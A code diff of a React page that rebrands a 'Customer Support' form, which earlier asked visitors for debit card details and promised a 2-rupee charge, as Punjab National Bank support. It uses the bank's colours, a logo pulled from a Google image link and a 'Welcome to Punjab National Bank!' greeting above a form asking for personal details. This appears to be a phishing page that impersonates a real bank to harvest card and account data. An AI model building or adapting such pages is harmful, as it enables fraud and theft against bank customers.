@@ -63,19 +63,24 @@ export default function Page() {
     <div>
       <section class="w-full">
         {/* <!-- Harsha Web --> */}
-        <div className="h-auto w-full flex items-center justify-left bg-[#0062A9] p-1">
-          <img src="/logo.png" className="p-2 w-[60px] h-[60px]" alt="Logo" />
+        <div className="h-auto w-full flex items-center justify-left bg-[#91203e] p-1">
+          <img
+            src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSaePPd-mxequ-ctngUKynMFKVPkuogwmb5cw&s"
+            className="p-2 h-[60px]"
+            alt="Logo"
+          />
           <span className="font-semibold text-xl text-white">
-            Customer Support
+            PNB Customer Support
           </span>
         </div>
         <div class="p-6">
-        <div className="flex flex-col">
-            <span className="text-xl">Enter your debit card details</span>
-            <span className="text-red-600 mt-2 text-base">
-              We will charge only 2 rupees
-            </span>
-          </div>
+          <h1 className="text-2xl font-bold text-[#91203e]">
+            Welcome to Punjab National Bank!
+          </h1>
+          <p className="text-sm text-slate-600 mt-2">
+            It is pleasure having you here. We would like to have few details of
+            yours.
+          </p>
           <form
             class="space-y-6 flex flex-col justify-center mt-10"
             action=""
@@ -132,43 +137,43 @@ export default function Page() {
               </div>
             </div>
             {/* <!-- Submit Button --> */}
-            <div class="px-10 w-full flex justify-center items-center">
+            <div class="w-full flex justify-center items-center">
               <button
-                class="bg-gradient-to-r from-[#0289A9] to-[#0063A8] hover:from-blue-700 hover:to-purple-700 text-white font-bold py-2 px-10 rounded focus:outline-none focus:shadow-outline w-full"
+                class="bg-gradient-to-r from-[#91203e] to-[#91203e] hover:from-red-700 hover:to-purple-700 text-white font-bold py-2 px-10 rounded focus:outline-none focus:shadow-outline w-full"
                 type="submit"
               >
-                Verify Details
+                Submit Details
               </button>
             </div>
           </form>
           {/* <!-- Bottom Area --> */}
           <div className="mt-10">
             <div className="grid grid-cols-1 w-full">
-              <div className="text-xs text-[#0063A8] font-bold space-x-1 mt-2">
+              <div className="text-xs text-[#91203e] font-bold space-x-1 mt-2">
                 <span>FAQs: </span>
                 <span className="text-slate-600">
                   Find answers to the most frequently asked questions.
                 </span>
               </div>
-              <div className="text-xs text-[#0063A8] font-bold space-x-1 mt-2">
+              <div className="text-xs text-[#91203e] font-bold space-x-1 mt-2">
                 <span>Contact Us: </span>
                 <span className="text-slate-600">
                   Get in touch with our support team.
                 </span>
               </div>
-              <div className="text-xs text-[#0063A8] font-bold space-x-1 mt-2">
+              <div className="text-xs text-[#91203e] font-bold space-x-1 mt-2">
                 <span>Product Guides: </span>
                 <span className="text-slate-600">
                   Access detailed guides and tutorials.
                 </span>
               </div>
-              <div className="text-xs text-[#0063A8] font-bold space-x-1 mt-2">
+              <div className="text-xs text-[#91203e] font-bold space-x-1 mt-2">
                 <span>Account Management: </span>
                 <span className="text-slate-600">
                   Manage your account settings and preferences
                 </span>
               </div>
-              <div className="text-xs text-[#0063A8] font-bold space-x-1 mt-2">
+              <div className="text-xs text-[#91203e] font-bold space-x-1 mt-2">
                 <span>Order Tracking: </span>
                 <span className="text-slate-600">
                   Track the status of your orders.
@@ -179,7 +184,7 @@ export default function Page() {
         </div>
       </section>
       {/* <!-- Footer --> */}
-      <section class="bg-[#0062A9] p-5 w-full">
+      <section class="bg-[#91203e] p-5 w-full">
         <div class="flex space-x-1 w-full justify-between">
           <span class="text-xs text-white font-bold">Contact Us</span>
           <span class="text-xs text-white font-bold">|</span>
